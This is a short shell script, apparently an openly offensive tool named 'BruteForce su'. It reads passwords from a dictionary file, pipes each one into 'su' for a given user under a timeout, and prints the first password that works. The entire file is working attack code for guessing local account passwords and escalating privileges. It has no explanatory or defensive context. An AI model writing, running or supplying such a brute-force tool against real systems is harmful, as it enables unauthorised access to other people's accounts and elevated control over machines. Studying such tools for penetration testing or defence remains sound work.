#!/bin/sh

ESC_GREEN="\033[1;32m"
ESC_BLUE="\033[1;34m"
ESC_RESET="\033[0m"
TIMEOUT=1.0

print_help() {
    echo "Usage: $0 user dictionary [timeout] ..."
    echo "You must specify both the username and the dictionary file."
    echo "Optionally, you can specify a timeout in seconds (e.g., 0.1)."
    exit 1
}

print_banner() {
    echo "$ESC_BLUE"
    echo "******************************"
    echo "*       BruteForce su        *"
    echo "******************************"
    echo "$ESC_RESET"
}

check_pass() {
    local password="$1"
    local user="$2"

    echo "$password" | timeout "$TIMEOUT" su "$user" >/dev/null 2>&1
    return $?
}

brute_force() {
    local dictionary="$1"
    local user="$2"

    if [ ! -f "$dictionary" ]; then
        echo "Error opening file: $dictionary"
        exit 1
    fi

    while IFS= read -r password; do
        password=$(echo "$password" | tr -d '\r\n')
        echo "Trying password: $password"
        if check_pass "$password" "$user"; then
            echo "${ESC_GREEN}Password found for user $user: $password${ESC_RESET}"
            break
        fi
    done < "$dictionary"
}

main() {
    if [ "$#" -lt 2 ]; then
        print_help
    fi

    print_banner
    user="$1"
    dictionary="$2"

    if [ "$#" -ge 3 ]; then
        TIMEOUT="$3"
        if [ -z "$(echo "$TIMEOUT" | grep -E '^[0-9]+(\.[0-9]+)?$')" ] || [ "$(echo "$TIMEOUT > 0" | bc)" -ne 1 ]; then
            echo "Invalid timeout value. Using default: 1.0s"
            TIMEOUT=1.0
        fi
    fi

    brute_force "$dictionary" "$user"
}

main "$@"
